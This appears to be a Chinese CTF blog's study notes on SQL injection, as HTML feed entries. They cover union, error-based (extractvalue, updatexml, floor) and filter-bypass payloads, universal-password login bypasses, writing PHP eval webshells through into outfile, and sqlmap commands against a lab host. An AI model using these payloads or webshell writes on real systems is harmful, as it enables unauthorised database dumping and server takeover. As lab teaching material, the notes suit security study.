variables;查看系统变量<br>show variables like ‘sec%’;使用like限制或者模糊查询</p><h4 id="1-2-MySQL读文件"><a href="#1-2-MySQL读文件" class="headerlink" title="1.2 MySQL读文件"></a>1.2 MySQL读文件</h4><p>MySQL新版本增加了一个secure_file_priv选项，用来读取文件进行限制。<br>secure_file_priv参数是用来限制load data,select……outfile,adn load_file()传到那个目录的。<br>当secure_file_peiv值为null时，表示MySQL不允许导入导出。<br>当secure_file_peiv值为&#x2F;tmp时，表示MySQL只允许在&#x2F;tmp目录导入导出<br>当secure_file_priv没有值时，表示MySQL对导入导出没有限制<br>开启方式，windows在my.ini中添加<code>secure_file_priv = </code>,linux在my.cnf中添加<code>secure_file_priv = </code>即可。</p><h4 id="1-3-文件操作函数"><a href="#1-3-文件操作函数" class="headerlink" title="1.3 文件操作函数"></a>1.3 文件操作函数</h4><p>load_file() 读取文件内容，返回一个字符串，文件必须位于服务器本地，必须使用绝对路径，并且对文件有操作权限，文件内容必须小于max_allowed_packet。注意：目录直接的区分使用&#x2F; 不能使用<br>实例：<code>select load_file(&#39;/www/wwwroot/web/7/6/flag.txt&#39;);</code></p><h3 id="2-load-file读文件"><a href="#2-load-file读文件" class="headerlink" title="2. load_file读文件"></a>2. load_file读文件</h3><p>payload：<code>password=admin&amp;username=&#39; union select 1,load_file(&#39;/www/wwwroot/web/7/6/flag.txt&#39;),3%23</code><br>load_file必须放在回显位。</p><h2 id="四、insert-into写文件"><a href="#四、insert-into写文件" class="headerlink" title="四、insert_into写文件"></a>四、insert_into写文件</h2><h3 id="1-写文件"><a href="#1-写文件" class="headerlink" title="1. 写文件"></a>1. 写文件</h3><h4 id="1-1-into-outfile写文件"><a href="#1-1-into-outfile写文件" class="headerlink" title="1.1 into outfile写文件"></a>1.1 into outfile写文件</h4><p>into outfile函数 用于把数据导出到一个文件中。<br>into outfile的用法：select [column_name] from [table_name] into outfile [path];<br>限制条件：和load_file一样，受到seccure_file_priv的限制；path要使用&#x2F;并且是绝对路径<br>写一句话：<code>select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; into outfile &#39;/www/wwwroot/web/7/7/value.php&#39;;</code></p><h4 id="1-2-dumpfile函数"><a href="#1-2-dumpfile函数" class="headerlink" title="1.2 dumpfile函数"></a>1.2 dumpfile函数</h4><p>dumpfile函数 也是用于把数据导入到一个文件中，限制一行。<br>dumpfile用法：select [column_name] from [table_name] where id&#x3D;1 into dumpfile [path];<br>限制条件：和load_file一样，受到seccure_file_priv的限制；path要使用&#x2F;并且是绝对路径<br>写一句话：<code>select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; into dumpfile &#39;/www/wwwroot/web/7/7/value.php&#39;;</code></p><h3 id="2-两种列用方式"><a href="#2-两种列用方式" class="headerlink" title="2. 两种列用方式"></a>2. 两种列用方式</h3><h4 id="2-1-直接写webshell"><a href="#2-1-直接写webshell" class="headerlink" title="2.1 直接写webshell"></a>2.1 直接写webshell</h4><p>写webshell：<code>password=admin&amp;username=dir&#39; union select 1,2,&quot;&lt;?php @eval($_GET[&#39;dir&#39;]);?&gt;&quot; into outfile &#39;/www/wwwroot/web/7/7/1.php&#39;%23</code><br>读取flag：<code>dir=readfile(&#39;flag.txt&#39;);</code></p><h4 id="2-2-利用文件包含"><a href="#2-2-利用文件包含" class="headerlink" title="2.2 利用文件包含"></a>2.2 利用文件包含</h4><p>使用场景：MySQL对文件读写做了限制，只允许在指定文件读写。<br>使用要求：当服务器存在文件包含漏洞时，可以利用文件包含+写文件来getshell</p><h2 id="五、str-replace绕过"><a href="#五、str-replace绕过" class="headerlink" title="五、str_replace绕过"></a>五、str_replace绕过</h2><h3 id="1-双写绕过"><a href="#1-双写绕过" class="headerlink" title="1. 双写绕过"></a>1. 双写绕过</h3><h4 id="1-1-str-replace函数"><a href="#1-1-str-replace函数" class="headerlink" title="1.1 str_replace函数"></a>1.1 str_replace函数</h4><p>str_replace是一个php函数，主要用于替换字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//把5替换为空</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-2-str-replace双写绕过"><a href="#1-2-str-replace双写绕过" class="headerlink" title="1.2 str_replace双写绕过"></a>1.2 str_replace双写绕过</h4><p>双写绕过一般是str_replace 出现了替换为空的情况因为str_replace是单次替换，不会在替换了一次之后，重新检查字符串能不能在被替换。<br>$username &#x3D; str_replace(‘union’,’’,$username);<br>针对这种方法，就可以利用username&#x3D;ununionion 这样的形式来绕过。<br>payload：<code>password=admin&amp;username=&#39;ununionion selselectect 1,2,3%23</code><br>SQL语句：<code>select * from user where username=&#39;&#39;union select 1,2,3#&#39;and password=&#39;admin&#39;;</code></p><h3 id="2-反斜杠绕过"><a href="#2-反斜杠绕过" class="headerlink" title="2. 反斜杠绕过"></a>2. 反斜杠绕过</h3><h4 id="1-1-反斜杠"><a href="#1-1-反斜杠" class="headerlink" title="1.1 反斜杠"></a>1.1 反斜杠</h4><p>\反斜杠用于把特殊字符转义为普通字符，比如’在sql中是闭合的作用，如果加上&#39;那他就是一个单引号，而不是闭合符号。</p><h4 id="1-2-反斜杠绕过"><a href="#1-2-反斜杠绕过" class="headerlink" title="1.2 反斜杠绕过"></a>1.2 反斜杠绕过</h4><p>$username&#x3D;str_replace(“‘“, ‘\&#39;‘, “admin’”);<br>最后运行的是：admin&#39;这样单引号就失去了闭合的作用，被当成了普通符号，这时候我们手动加一个反斜杠，这时被替换成admin\\‘，1 3个反斜杠转义了2 4个反斜杠，所有单引号就能跳出来。<br>payload：<code>password=admin&amp;username=\&#39;union select 1,2,3%23</code><br>SQL语句：<code>select * from user where username=&#39;\\&#39;union select 1,2,3#&#39;and password=&#39;admin&#39;;</code></p><h2 id="六、sqlmap使用"><a href="#六、sqlmap使用" class="headerlink" title="六、sqlmap使用"></a>六、sqlmap使用</h2><p>参考：<a href="https://xz.aliyun.com/t/2746">sqlmap自带绕过脚本tamper</a></p><h3 id="1-sqlmap的环境介绍"><a href="#1-sqlmap的环境介绍" class="headerlink" title="1. sqlmap的环境介绍"></a>1. sqlmap的环境介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.gitgit代码管理残酷</span><br><span class="line">doc包含sqlmap的具体使用说明</span><br><span class="line">xmlpayload目录</span><br><span class="line">shell包含多种语言的shell，当作注入成功后，就可以使用shell来连接远程服务器</span><br><span class="line">waf常见的防火前特征</span><br><span class="line">tamper包含一些常见的的waf绕过脚本</span><br></pre></td></tr></table></figure><h3 id="2-sqlmap的一些常用参数"><a href="#2-sqlmap的一些常用参数" class="headerlink" title="2. sqlmap的一些常用参数"></a>2. sqlmap的一些常用参数</h3><p>检查指定url是否存在sql注入<br>sqlmap.py -u url</p><p>当前正在使用的数据库名称<br>sqlmap.py -u url –current-db</p><p>当前正在使用的用户名<br>sqlmap.py -u url –current-user</p><p>列出所有数据库<br>sqlmap.py -u url –dbs</p><p>列出指定数据库的所有表<br>sqlmap.py -u url -D database –tables</p><p>指定库名和表名列出所有列名<br>sqlmap.py -u url -D database -T table –columns</p><p>获取全部列名数据<br>sqlmap.py -u url -D database -T table –dump</p><p>获取指定列名数据<br>sqlmap.py -u url -D database -T table -C column –dump</p><p>指定获取多少条数据<br>sqlmap.py -u url -D database -T table -C column  –start x –stop y –dump</p><p>延迟注入<br>sqlmap.py -u url –delay 2</p><p>最大http请求并发数量(线程)<br>sqlmap.py -u url –threads 10</p><h3 id="3-使用sqlmap实现注入"><a href="#3-使用sqlmap实现注入" class="headerlink" title="3. 使用sqlmap实现注入"></a>3. 使用sqlmap实现注入</h3><h4 id="3-1-检查是否存在sql注入"><a href="#3-1-检查是否存在sql注入" class="headerlink" title="3.1 检查是否存在sql注入"></a>3.1 检查是否存在sql注入</h4><p>paylaod：<code>py -3 sqlmap.py -u &quot;http://192.168.1.128/7/9/strsql.php&quot; --data=&quot;username=admin&quot; --batch</code><br>–data&#x3D;”username&#x3D;admin”指定注入名，post方式提交。<br>–batch 默认值注入，不需要人为选择</p><h4 id="3-2-查询所有数据库"><a href="#3-2-查询所有数据库" class="headerlink" title="3.2 查询所有数据库"></a>3.2 查询所有数据库</h4><p>paylaod：<code>py -3 sqlmap.py -u &quot;http://192.168.1.128/7/9/strsql.php&quot; --data=&quot;username=admin&quot; -dbs</code><br>可以加入线程参数，–threads 10</p><p><strong>完结</strong></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入学习笔记1</title>
      <link href="/posts/c70/"/>
      <url>/posts/c70/</url>
      
        <content type="html"><![CDATA[<h2 id="一、字符型和数字型注入"><a href="#一、字符型和数字型注入" class="headerlink" title="一、字符型和数字型注入"></a>一、字符型和数字型注入</h2><h3 id="1-and-or-操作符"><a href="#1-and-or-操作符" class="headerlink" title="1. and or 操作符"></a>1. and or 操作符</h3><h4 id="1-1-简述"><a href="#1-1-简述" class="headerlink" title="1.1 简述"></a>1.1 简述</h4><p>  and和or属于运算符，主要用途是把多个条件结合起来，过滤sql语句的返回结果。主要用在where语句中。</p><h4 id="1-2-作用"><a href="#1-2-作用" class="headerlink" title="1.2 作用"></a>1.2 作用</h4><ul><li>可以起到一个条件连接的作用，尤其是在盲注时</li><li>当注释符被过滤，还可以使用and加上一个retu条件，闭合单引号</li></ul><h4 id="1-3-and"><a href="#1-3-and" class="headerlink" title="1.3 and"></a>1.3 and</h4><p>and 又叫与运算,当两个条件都为真时，返回真，否则为假。格式：条件1 adn 条件2<br>实例：<code>select * from user where id=7 and username=&#39;admin&#39;;</code><br>虽然id&#x3D;7的数据存在，但这条数据的username不是admin，所以返回数据为空<br><img src="https://img.xpctf.cn/img/20200616100440.png"></p><h4 id="1-4-or"><a href="#1-4-or" class="headerlink" title="1.4 or"></a>1.4 or</h4><p>or又叫或运算，有一个条件为真，结果为真，两边都为假，则为假。格式：条件1 or 条件2<br>实例：<code>select * from user where id=8 or username=&#39;test1&#39;;</code><br>满足条件的数据有两个，所以输出两条数据<br><img src="https://img.xpctf.cn/img/20200616100021.png"></p><h3 id="2-MySQL注释符"><a href="#2-MySQL注释符" class="headerlink" title="2. MySQL注释符"></a>2. MySQL注释符</h3><h4 id="2-1-作用"><a href="#2-1-作用" class="headerlink" title="2.1 作用"></a>2.1 作用</h4><p>  当程序运行时，不会对注释的内容做任何处理，注释一般可以出现在程序的任何地方，用来提示或者解释程序功能。</p><h4 id="2-2-单行注释"><a href="#2-2-单行注释" class="headerlink" title="2.2 单行注释"></a>2.2 单行注释</h4><p>在MySQL中单行注释符号有两个，一个是<code>#</code>，另一个是<code>-- -</code><br><code>-- -</code>比较特殊，他的原型是<code>-- </code>,两个杠后面有个空格，但为了区分空格常常在后面有个字符，那个字符可以为任意字符，也可以不加，但空格不能少。<br><img src="https://img.xpctf.cn/img/20200616102132.png" alt="#"><br><img src="https://img.xpctf.cn/img/20200616102213.png" alt="-- -"></p><h4 id="2-3-多行注释"><a href="#2-3-多行注释" class="headerlink" title="2.3 多行注释"></a>2.3 多行注释</h4><p>多行使用<code>/**/</code>来注释，在一般单行注释被过滤的时候使用，但是必须闭合，所以我不知道他在注入中的意义在哪里。</p><h3 id="3-数字型注入"><a href="#3-数字型注入" class="headerlink" title="3. 数字型注入"></a>3. 数字型注入</h3><p>简述：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p><h4 id="3-1-加单引号"><a href="#3-1-加单引号" class="headerlink" title="3.1 加单引号"></a>3.1 加单引号</h4><p>URL：<code>www.text.com/text.php?id=3&#39;</code><br>SQL：<code>select * from table where id=3&#39;</code><br>如果sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常，此时可能存在SQL注入</p><h4 id="3-2-加and-1-x3D-1"><a href="#3-2-加and-1-x3D-1" class="headerlink" title="3.2 加and 1&#x3D;1"></a>3.2 加and 1&#x3D;1</h4><p>URL：<code>www.text.com/text.php?id=3 and 1=1</code><br>SQL：<code>select * from table where id=3’ and 1=1</code><br>语句执行正常，与原始页面如任何差异，此时可能存在SQL注入</p><h4 id="3-3-加and-1-x3D-2"><a href="#3-3-加and-1-x3D-2" class="headerlink" title="3.3 加and 1&#x3D;2"></a>3.3 加and 1&#x3D;2</h4><p>URL：<code>www.text.com/text.php?id=3 and 1=2</code><br>SQL：<code>select * from table where id=3 and 1=2</code><br>语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异,此时可能存在SQL注入</p><h4 id="3-4-防御数字型注入"><a href="#3-4-防御数字型注入" class="headerlink" title="3.4 防御数字型注入"></a>3.4 防御数字型注入</h4><p>  使用intval函数强制把用户输入的内容转换为int类型。</p><h3 id="4-字符型注入"><a href="#4-字符型注入" class="headerlink" title="4. 字符型注入"></a>4. 字符型注入</h3><p>  简述：当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来包裹，而字符串一般需要通过单引号来包裹字符。<br>例如数字型语句：<code>select * from table where id =3</code><br>而字符型如下：<code>select * from table where name=&#39;admin&#39;</code><br>因此，在构造payload时通过闭合单引号可以成功执行语句</p><h4 id="4-1-加单引号"><a href="#4-1-加单引号" class="headerlink" title="4.1 加单引号"></a>4.1 加单引号</h4><p>URL：<code>www.text.com/text.php?name=admin&#39;</code><br>SQL：<code>select * from table where name=&#39;admin&#39;&#39;</code><br>由于加单引号后变成三个单引号，则无法执行，如果报错，此时可能存在SQL注入</p><h4 id="4-2-加-’and-1-x3D-1"><a href="#4-2-加-’and-1-x3D-1" class="headerlink" title="4.2 加 ’and 1&#x3D;1"></a>4.2 加 ’and 1&#x3D;1</h4><p>URL：<code>www.text.com/text.php?name=admin&#39; and 1=1</code><br>SQL：<code>select * from table where name=&#39;admin&#39; and 1=1&#39;</code></p><p>也无法进行注入，还需要通过注释符号将其绕过,或者闭合后面的双引号</p><h4 id="4-3-加‘and-1-x3D-2–"><a href="#4-3-加‘and-1-x3D-2–" class="headerlink" title="4.3 加‘and 1&#x3D;2– +"></a>4.3 加‘and 1&#x3D;2– +</h4><p>URL：<code>www.text.com/text.php?name=admin&#39; and 1=2-- +</code><br>SQL：<code>select * from table where name=&#39;admin&#39; and 1=2-- +&#39;</code><br>由于最后有个单引号被注释，所以该SQL语句合法，加1&#x3D;2类似数字型注入。</p><h4 id="4-4-万能密码"><a href="#4-4-万能密码" class="headerlink" title="4.4 万能密码"></a>4.4 万能密码</h4><p>字符型万能密码必须闭合单引号，可以通过注释，也可以通过闭合最后的单引号</p><ul><li>‘ or 1&#x3D;1 – +</li><li>‘ or ‘1’&#x3D;’1</li><li>‘ or 1– +</li></ul><h4 id="4-5-防御字符型注入"><a href="#4-5-防御字符型注入" class="headerlink" title="4.5 防御字符型注入"></a>4.5 防御字符型注入</h4><p>因为字符型注入需要输入单引号来闭合SQL语句，所以在防御上可以过滤单引号和转义单引号。</p><ul><li>使用addslashes函数对用户输入的字符进行转义</li></ul><h2 id="二、union联合查询注入"><a href="#二、union联合查询注入" class="headerlink" title="二、union联合查询注入"></a>二、union联合查询注入</h2><h3 id="1-union"><a href="#1-union" class="headerlink" title="1. union"></a>1. union</h3><p>union主要是把两个查询结果连接起来，放到一个结果集；前后查询的列名可以不一样，但列的数量必须一致。<br>SQL：<code>select username,password from user union select id from user;</code><br><img src="https://img.xpctf.cn/img/20200617112814.png"><br>因为前面查询的是username,password两个列，后面值查询了id一个列，所以抛出错误。</p><h3 id="2-order-by"><a href="#2-order-by" class="headerlink" title="2.order by"></a>2.order by</h3><p>order by 主要是根据列名来排序，默认按照升序对结果集进行排序；也可以使用desc关键字来对结果集进行降序排序</p><p>在SQL注入中常常被利用来检测返回多少列，当order by根据一个不存在的列排序会报错，所以可以用来查询列的数量；为union联合查询做准备。</p><p>SQL：<code>select * from user order by 5;</code><br><img src="https://img.xpctf.cn/img/20200617114041.png"></p><p>上面的SQL语句之所以会报错，是因为user表里面没有5个列，但我们使用第5个列来进行升序排序，所以报错。从而判断出该SQL语句返回4列。</p><p>order by 也可以直接使用列名来排序,这样的方式可以用来爆列名。比如：<code>select * from user order by id;</code></p><p>使用desc来进行奖项排序 <code>select * from user order by id desc;</code><br><img src="https://img.xpctf.cn/img/20200617115000.png"></p><h3 id="3-information-schema库"><a href="#3-information-schema库" class="headerlink" title="3. information_schema库"></a>3. information_schema库</h3><p>information_schema库是MySQL服务器自带的一个数据库，它提供了访问MySQL数据库元信息的方式，记录了MySQL服务器中的所有数据库名、表名、列名；这是学习MySQL注入必须掌握的一个知识点。</p><h4 id="3-1-schemata表"><a href="#3-1-schemata表" class="headerlink" title="3.1 schemata表"></a>3.1 schemata表</h4><p>schemata表记录了所有数据库的，列名为schema_name<br><img src="https://img.xpctf.cn/img/20200617145955.png"></p><h4 id="3-2-tables表"><a href="#3-2-tables表" class="headerlink" title="3.2 tables表"></a>3.2 tables表</h4><p>tables表记录了所有的表名，列名为table_name;包括该表属于那个数据库，列名为table_schema<br><img src="https://img.xpctf.cn/img/20200617150621.png"></p><h4 id="3-3-columns表"><a href="#3-3-columns表" class="headerlink" title="3.3 columns表"></a>3.3 columns表</h4><p>columns表记录了所有的列名，列名为column_name;数据库名称列名table_name;表名称列名为table_schema。<br><img src="https://img.xpctf.cn/img/20200617184130.png"></p><h3 id="4-union联合查询注入"><a href="#4-union联合查询注入" class="headerlink" title="4. union联合查询注入"></a>4. union联合查询注入</h3><p><strong>基本流程：判断类型&#x3D;&gt;猜列数&#x3D;&gt;测回显&#x3D;&gt;爆库名&#x3D;&gt;爆表名&#x3D;&gt;爆列名&#x3D;&gt;爆数据</strong></p><h4 id="4-1-利用条件"><a href="#4-1-利用条件" class="headerlink" title="4.1 利用条件"></a>4.1 利用条件</h4><ul><li>页面可以把数据输出：union联合查询需要把数据回显到页面上，所以使用union联合查询注入时，页面一定要把数据回显出来</li><li>union关键字没有被过滤：大多数SQL环境中，都会有WAF，对用户输出的字符串进行一定的过滤，所以只有当union这个关键词没有被过滤，或者可以绕过过滤的时候，才能使用union联合查询注入</li></ul><h4 id="4-2-判断类型"><a href="#4-2-判断类型" class="headerlink" title="4.2 判断类型"></a>4.2 判断类型</h4><p>通过加单引号的的方式判断类型，在正常返回的语句上加入单引号，如果返回异常，则为字符型，反之为数字型注入。<br>通过输入单引号返回异常，我们判断该注入为数字型注入。</p><p><img src="https://img.xpctf.cn/img/20200617193644.png" alt="返回正常"><br><img src="https://img.xpctf.cn/img/20200617193711.png" alt="返回异常"></p><h4 id="4-3-猜列数"><a href="#4-3-猜列数" class="headerlink" title="4.3 猜列数"></a>4.3 猜列数</h4><p>通过使用order by排序来判断返回列数；返回正常加列数，返回异常减列数<br>输入4正常返回，5不能正常返回，所以判断返回4个列。<br><img src="https://img.xpctf.cn/img/20200617194213.png"></p><h4 id="4-4-测回显"><a href="#4-4-测回显" class="headerlink" title="4.4 测回显"></a>4.4 测回显</h4><p>paylaod：<code>-1 union select 1,2,3,4;</code><br>id为-1的目的时为了上前面的语句报错，顺利的输出联合查询后面的语句。<br>1,2,3,4是上面得到四个列，因为联合查询前后的语句列数必须相等。<br>通过回显我发现回显位置在2和3上，在2和3上做注入查询。<br><img src="https://img.xpctf.cn/img/20200617195406.png"></p><h4 id="4-5-爆库名"><a href="#4-5-爆库名" class="headerlink" title="4.5 爆库名"></a>4.5 爆库名</h4><p>使用MySQL自带的函数，database()来查看当前使用的数据库；通过回显确定当前使用的数据库为web数据库。<br><img src="https://img.xpctf.cn/img/20200617195743.png"></p><h4 id="4-6-爆表名"><a href="#4-6-爆表名" class="headerlink" title="4.6 爆表名"></a>4.6 爆表名</h4><p>payload：<code>-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=&#39;web&#39;;</code><br>通过查询information_schema数据库的tables表的table_name列来返回表名，条件是web数据库的表。<br><img src="https://img.xpctf.cn/img/20200617202823.png"></p><h4 id="4-7-爆列名"><a href="#4-7-爆列名" class="headerlink" title="4.7 爆列名"></a>4.7 爆列名</h4><p>payload：<code>-1 union select 1,column_name,3,4 from information_schema.columns where table_name=&#39;user&#39; and table_schema=&#39;web&#39;</code><br>查询information_schema数据库的columns表的column_name列来返回列名，限制查询web数据库的user表。</p><p><img src="https://img.xpctf.cn/img/20200617203432.png"></p><h4 id="4-8-爆数据"><a href="#4-8-爆数据" class="headerlink" title="4.8 爆数据"></a>4.8 爆数据</h4><p>查询user表里的id列的值。<br><img src="https://img.xpctf.cn/img/20200617203620.png"></p><h2 id="三、extractvalue报错注入"><a href="#三、extractvalue报错注入" class="headerlink" title="三、extractvalue报错注入"></a>三、extractvalue报错注入</h2><p>什么是报错注入：当计算机接收到非预期的输入就会报错，所以可以利用数据库的报错机制，人为的构造一些错误，让数据库把敏感信息爆出。<br>优点：当使用union联合查询被过滤时，可以使用报错注入，对列的数量没有要求<br>缺点：大多数情况下都会屏蔽报错信息，一旦屏蔽了报错信息，那就无法使用报错注入了</p><h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h3><h4 id="1-1-xml基础"><a href="#1-1-xml基础" class="headerlink" title="1.1 xml基础"></a>1.1 xml基础</h4><p>XML是一门可扩展标记语言，用于传输和存储数据;XML元素与HTML的格式类似，但是XML格式要求更严格</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-2-extractvalue"><a href="#1-2-extractvalue" class="headerlink" title="1.2 extractvalue"></a>1.2 extractvalue</h4><p>extractvlue(XML_document,Xpath_str) 是用来提取XML数据的<br>参数一：XML_document XML对象可以是XML文件或者XML字符串<br>参数二：Xpath_str Xpath是格式的字符串<br><code>select extractvalue(&#39;&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;qwe123&lt;/password&gt;&lt;/user&gt;&#39;,&#39;/user/username&#39;);</code></p><h4 id="1-3-updatexml"><a href="#1-3-updatexml" class="headerlink" title="1.3 updatexml"></a>1.3 updatexml</h4><p>updatexml (XML_document,Xpath_string,new_value) 替换数据<br>参数一：XML_document XML对象可以是XML文件或者XML字符串<br>参数二：Xpath_str Xpath是格式的字符串<br>参数三：new_value 替换查找到的字符串</p><h4 id="1-4-concat"><a href="#1-4-concat" class="headerlink" title="1.4 concat"></a>1.4 concat</h4><p>concat(字符串1,字符串2,字符串n) 该函数是用来连接字符串。</p><h4 id="1-5-group-concat"><a href="#1-5-group-concat" class="headerlink" title="1.5 group_concat"></a>1.5 group_concat</h4><p>group_concat函数将多行结果合并成1一行，用逗号分隔，常用函数！</p><h4 id="1-6-substr函数"><a href="#1-6-substr函数" class="headerlink" title="1.6 substr函数"></a>1.6 substr函数</h4><p>substr函数将一个字符串截取，返回截取后的字符串<br>用法：substr(源字符串,开始,截取长度)<br>如果忽略参数三，截取到字符串末尾</p><h4 id="1-7-子查询"><a href="#1-7-子查询" class="headerlink" title="1.7 子查询"></a>1.7 子查询</h4><p>子查询也叫内查询、嵌套查询，是一种嵌套在其他语句中进行的查询，在报错注入中使用最多。<br>子查询规则：必须在括号内，子查询的select语句中，只能有一个列，除非主查询有多个列<br>实例：select(flag)from(flag);</p><h3 id="2-extractvalue报错注入"><a href="#2-extractvalue报错注入" class="headerlink" title="2. extractvalue报错注入"></a>2. extractvalue报错注入</h3><h4 id="2-1-确定注入点"><a href="#2-1-确定注入点" class="headerlink" title="2.1 确定注入点"></a>2.1 确定注入点</h4><p>payload：<code>id = 1 and (extractvalue(1,concat(0x5c,(select user()))))#</code><br><img src="https://img.xpctf.cn/img/20200625155521.png"></p><h4 id="2-2-爆数据库"><a href="#2-2-爆数据库" class="headerlink" title="2.2 爆数据库"></a>2.2 爆数据库</h4><p>payload：<code>id = 1 and (extractvalue(1,concat(0x5c,(select database()))))#</code><br><img src="https://img.xpctf.cn/img/20200625155834.png"></p><h4 id="2-3-爆表名"><a href="#2-3-爆表名" class="headerlink" title="2.3 爆表名"></a>2.3 爆表名</h4><p>payload：<code>id=1 and (extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;web&#39;))))%23</code><br><img src="https://img.xpctf.cn/img/20200625160202.png"></p><h4 id="2-4-爆列名"><a href="#2-4-爆列名" class="headerlink" title="2.4 爆列名"></a>2.4 爆列名</h4><p>payload：<code>id=1 and (extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;))))%23</code><br><img src="https://img.xpctf.cn/img/20200625160507.png"></p><h4 id="2-5-拿到flag"><a href="#2-5-拿到flag" class="headerlink" title="2.5 拿到flag"></a>2.5 拿到flag</h4><p>payload：<code>id=1 and (extractvalue(1,concat(1,(select flag from flag))))%23</code><br><img src="https://img.xpctf.cn/img/20200625160623.png"><br>由于报错注入最多只能返回32位字符，所以我们使用substr来截取后面部分。<br>payload：<code>id=1 and (extractvalue(1,concat(1,(select substr(flag,30) from flag))))%23</code><br><img src="https://img.xpctf.cn/img/20200625162719.png"></p><h3 id="3-updatexml报错注入"><a href="#3-updatexml报错注入" class="headerlink" title="3. updatexml报错注入"></a>3. updatexml报错注入</h3><p>payload：<code>id= 1 and (updatexml(1,concat(1,(select user())),1))%23</code><br>payload分析：<br>   参数一：随便写，不合法即可<br>   参数二：concat连接的非xpath格式字符串，sql语句<br>   参数三：随便写，不合法即可</p><h4 id="3-1-爆数据库"><a href="#3-1-爆数据库" class="headerlink" title="3.1 爆数据库"></a>3.1 爆数据库</h4><p>payload：<code>id= 1 and (updatexml(1,concat(1,(select database())),1))%23</code><br><img src="https://img.xpctf.cn/img/20200625163731.png"></p><h4 id="3-2-爆表名"><a href="#3-2-爆表名" class="headerlink" title="3.2 爆表名"></a>3.2 爆表名</h4><p>payload：<code>id= 1 and (updatexml(1,concat(1,(select group_concat( table_name) from information_schema.tables where table_schema=&#39;web&#39;)),1))%23</code><br>这里使用的是group_concat来合并两行内容，当group_concat被屏蔽时，可以使用limit来一行一行输出。<br>payload：<code>id= 1 and (updatexml(1,concat(1,(select table_name from information_schema.tables where table_schema=&#39;web&#39; limit 0,1)),1))%23</code></p><h4 id="3-3-爆字段"><a href="#3-3-爆字段" class="headerlink" title="3.3 爆字段"></a>3.3 爆字段</h4><p>payload：<code>id= 1 and (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;)),1))%23</code><br>构造好payload后修改关键部分即可使用。</p><h4 id="3-4-拿到flag"><a href="#3-4-拿到flag" class="headerlink" title="3.4 拿到flag"></a>3.4 拿到flag</h4><p>payload：<code>id= 1 and (updatexml(1,concat(1,(select flag from flag)),1))%23</code><br>拿到表名，列名即可构造查询语句来爆出值，显示不全使用substr。如果是root账号登录还可以跨数据库查询。</p><h2 id="四、floor报错注入"><a href="#四、floor报错注入" class="headerlink" title="四、floor报错注入"></a>四、floor报错注入</h2><h3 id="1-基础函数"><a href="#1-基础函数" class="headerlink" title="1. 基础函数"></a>1. 基础函数</h3><h4 id="1-1-floor函数"><a href="#1-1-floor函数" class="headerlink" title="1.1 floor函数"></a>1.1 floor函数</h4><p>取整，不进行四舍五入，忽略小数位返回整数部分。<br><code>select floor(0.8);==&gt;0</code><br><code>select floor(1.8);==&gt;1</code></p><h4 id="1-2-count函数"><a href="#1-2-count函数" class="headerlink" title="1.2 count函数"></a>1.2 count函数</h4><p>返回匹配条件的行数，一般和group by使用<br><img src="https://img.xpctf.cn/img/20200624110532.png"></p><h4 id="1-3-group-by函数"><a href="#1-3-group-by函数" class="headerlink" title="1.3 group by函数"></a>1.3 group by函数</h4><p>分组查询，把相同的列放在一起<br><img src="https://img.xpctf.cn/img/20200624113411.png"></p><p>使用count函数和group by函数返回列数<br><img src="https://img.xpctf.cn/img/20200624113643.png"></p><h4 id="1-4-rand函数"><a href="#1-4-rand函数" class="headerlink" title="1.4 rand函数"></a>1.4 rand函数</h4><p>产生有个0-1的随机数，格式select rand();<br>如果固定种子，产生的相同的数。</p><h4 id="1-5-limit函数"><a href="#1-5-limit函数" class="headerlink" title="1.5 limit函数"></a>1.5 limit函数</h4><p>limit函数用来限制sql语句的返回行数。<br>格式：limit 开始行，结束行(索引从0开始)</p><h3 id="2-主键重复报错注入"><a href="#2-主键重复报错注入" class="headerlink" title="2. 主键重复报错注入"></a>2. 主键重复报错注入</h3><p>payload：<code>id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x) a)</code><br>payload分析：<br>   